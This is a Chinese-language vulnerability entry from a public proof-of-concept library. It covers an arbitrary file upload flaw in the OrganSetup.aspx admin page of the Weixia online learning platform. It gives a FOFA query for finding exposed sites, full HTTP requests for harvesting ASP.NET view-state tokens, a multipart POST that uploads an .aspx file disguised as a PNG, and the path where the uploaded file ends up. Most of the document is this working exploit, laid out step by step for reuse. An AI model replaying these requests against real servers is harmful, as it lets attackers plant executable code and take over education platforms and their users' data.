---
fofa: "body="
source: "wy876 漏洞文库"
---

## 微厦在线学习平台OrganSetup存在任意文件上传漏洞

<a name="TDLmQ"></a>
# 一、漏洞简介
微厦在线学习云服务平台是一款基于B/S架构的在线教育系统，系统将在线学习、在线练习、在线考试紧密相联，打造“学、练、考”于一体的在线教育系统，方便学员利用碎片化时间进行随时随地的学习。 微厦在线学习平台OrganSetup存在任意文件上传漏洞，该漏洞产生的原因是页面文件上传功能模块未限制文件上传的类型所致，攻击者可利用漏洞上传任意文件。
<a name="emywd"></a>
# 二、影响版本

- 微厦在线学习平台
<a name="osOKJ"></a>
# 三、资产测绘

- fofa`body="/Utility/CoreScripts/Widget.js"`
- 特征

![image.png](./.resource/微厦在线学习平台OrganSetup存在任意文件上传漏洞/media/img-ef036e4a.png)

<a name="tfrdv"></a>
# 四、漏洞复现

1. 获取`__VIEWSTATE`和`__EVENTVALIDATION`
```
GET /Manage/Admin/OrganSetup.aspx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
```
![image.png](./.resource/微厦在线学习平台OrganSetup存在任意文件上传漏洞/media/img-3126184d.png)


2. 通过上一步获取的`__VIEWSTATE`和`__EVENTVALIDATION`替换后，上传文件
```
POST /Manage/Admin/OrganSetup.aspx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------286092866711427024533444908228
Content-Length: 3614
Connection: close
Cookie: stOnlineNumx=189; ASP.NET_SessionId=opim4u53mjzvbgoljz2haqwb; admincode=4cdcf18ba72a7b28dc405b992f8cddcd
Upgrade-Insecure-Requests: 1

-----------------------------286092866711427024533444908228
Content-Disposition: form-data; name="__VIEWSTATE"

/wEPDwUJNDA4NTQ0MTE3D2QWAmYPZBYCAgMQFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb3JtLWRhdGFkFgICAQ9kFggCAQ8PFgIeBFRleHQFAnd4ZGQCAg8PFgIfAQUGbmV0LmNuZGQCBg8WAh4Dc3JjBRwvVXBsb2FkL09yZy80X1FyQ29kZUxvZ28ucG5nZAIKDxYCHwIFIi9VcGxvYWQvT3JnLzIwMjQwNTExMTI0OTEyNTc1MC5wbmdkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYGBRljdGwwMCRjcGhNYWluJGNiUXJDb2RlSW1nBRxjdGwwMCRjcGhNYWluJGNiSXNSZWdUZWFjaGVyBRxjdGwwMCRjcGhNYWluJGNiSXNSZWdTdHVkZW50BR9jdGwwMCRjcGhNYWluJGNiSXNWZXJpZnlUZWFoY2VyBR9jdGwwMCRjcGhNYWluJGNiSXNWZXJpZnlTdHVkZW50BR5jdGwwMCRjcGhNYWluJGNiSXNUcmFuaW5nTG9naW4XwDNAV+ZrEETfEtS7I06DP27E1Ue95vMfV7lK7B4pSA==
-----------------------------286092866711427024533444908228
Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"

B81C8FAF
-----------------------------286092866711427024533444908228
Content-Disposition: form-data; name="__EVENTVALIDATION"

/wEdABuXaZiIoX5gkQRvpF+2vQ1CScjH4FFxAL+q4ikvLb0TbSiWUJN9ewejftZN9NIRAZX8aOtXKKXMs4QwiK7tN3gtzihlgKCbI0tOkOamx+rqIhHCHm4RWkFr+a7clSFrmCpT4H5AYBZWD7y6ZnyuYB3wY9S4hf/bSSiOFKbV8VtV+o/lBZVSldKXr63E+Da/Ksk9OyH/Pd1N/JheGeToMPcB512IH1WCLIOrwXUR5JAN8jZQlA012L+yVy6B2bVhsHRzBu3QIS1yhvK544/l15LleUfW6CS8LTlkV7ql5wks9UDmnWWs9n4CICssLcmek6WlGfPbaDlTV/qBU29Pg5LbEMtB73No2hK5uVkpHc5v6Su9Km7kpM4hPQiBs3qbphapVgU6eZvs6enycTR/SccY2QVQ1xafrB+nmau2RuS8oV6UpkC/qEKYpECUsLP/4kcZiCWzyQOdiFBPB3/S77l/pExTxwAd0OseRHgvXu4R5kLJ9zJhvPDeyll0gaN5/QndXVRdTquB1CKakTnbk7C2PjLy0sA2hNcT9aDiwRuR0OQ8KCMWCCyvM/z1yLlzyfGq4Ybqnh1PXRuwBSxfbkjJdvRUxmjpy6h1MF/eY+nsjQ==
-----------------------------286092866711427024533444908228
Content-Disposition: form-data; name="ctl00$cphMain$Org_PlatformName"


-----------------------------286092866711427024533444908228
Content-Disposition: form-data; name="ctl00$cphMain$Org_ICP"


-----------------------------286092866711427024533444908228
Content-Disposition: form-data; name="ctl00$cphMain$tbQrColor"

#004a80
-----------------------------286092866711427024533444908228
Content-Disposition: form-data; name="ctl00$cphMain$cbQrCodeImg"

on
-----------------------------286092866711427024533444908228
Content-Disposition: form-data; name="ctl00$cphMain$fuQrCenter"; filename=""
Content-Type: application/octet-stream


-----------------------------286092866711427024533444908228
Content-Disposition: form-data; name="ctl00$cphMain$Org_QrCodeUrl"


-----------------------------286092866711427024533444908228
Content-Disposition: form-data; name="ctl00$cphMain$fuLoad"; filename="1.aspx"
Content-Type: image/png

123
-----------------------------286092866711427024533444908228
Content-Disposition: form-data; name="ctl00$cphMain$btnLogo"

1
-----------------------------286092866711427024533444908228
Content-Disposition: form-data; name="ctl00$cphMain$cbIsVerifyTeahcer"

on
-----------------------------286092866711427024533444908228
Content-Disposition: form-data; name="ctl00$cphMain$cbIsVerifyStudent"

on
-----------------------------286092866711427024533444908228
Content-Disposition: form-data; name="ctl00$cphMain$ddlQscale"

7
-----------------------------286092866711427024533444908228
Content-Disposition: form-data; name="ctl00$cphMain$Org_Keywords"


-----------------------------286092866711427024533444908228
Content-Disposition: form-data; name="ctl00$cphMain$Org_Description"


-----------------------------286092866711427024533444908228
Content-Disposition: form-data; name="ctl00$cphMain$Org_Extracode"


-----------------------------286092866711427024533444908228--

```
![image.png](./.resource/微厦在线学习平台OrganSetup存在任意文件上传漏洞/media/img-32d12fc4.png)
<br />文件位置
```
/Upload/Org/202405111247022210.aspx
```
![image.png](./.resource/微厦在线学习平台OrganSetup存在任意文件上传漏洞/media/img-2ca6edb0.png)


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
